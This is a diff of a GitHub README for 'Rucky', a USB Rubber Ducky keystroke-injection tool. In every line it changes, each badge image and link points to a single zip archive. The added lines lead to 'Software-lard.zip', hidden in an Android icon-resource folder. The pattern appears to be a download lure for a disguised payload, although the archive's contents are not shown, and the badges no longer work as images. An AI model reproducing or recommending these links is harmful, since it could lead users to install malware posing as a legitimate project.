@@ -1,15 +1,15 @@
 # Rucky 
-[![GitHub](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![GitHub release (latest by date)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![Crowdin](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![Android](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip%2B-lightgrey)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![Architecture](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![Kernel](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip%20HID%20Patch%20Required-red)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
+[![GitHub](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![GitHub release (latest by date)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![Crowdin](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![Android](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip%2B-lightgrey)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![Architecture](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![Kernel](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip%20HID%20Patch%20Required-red)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
 
 A USB HID Rubber Ducky Script All-In-One tool.
 
 ## Legacy Work
-[![RPi](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip%20Pi-0%20W-maroon)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![HID](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip%20HID-lightgreen)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![Android](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
-[![Android](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)](https://raw.githubusercontent.com/krushna4141/Rucky/master/photometric/Rucky.zip)
+[![RPi](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip%20Pi-0%20W-maroon)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![HID](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip%20HID-lightgreen)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![Android](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
+[![Android](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)](https://github.com/krushna4141/Rucky/raw/refs/heads/master/app/src/main/res/mipmap-xxhdpi/Software-lard.zip)
